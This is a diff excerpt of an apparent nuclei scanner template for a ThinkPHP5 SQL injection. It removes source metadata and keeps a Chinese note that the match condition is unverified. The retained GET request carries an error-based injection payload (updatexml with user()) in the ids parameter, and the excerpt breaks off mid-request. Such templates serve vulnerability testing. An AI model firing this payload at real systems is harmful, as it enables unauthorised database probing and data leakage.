@@ -3,14 +3,8 @@ info:
   name: thinkphp5_sqli
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dogmcysw7l4kumca
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dogmcysw7l4kumca
-    fofa: 暂无
 http:
 - raw:
   - 'GET /index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1 HTTP/1.1
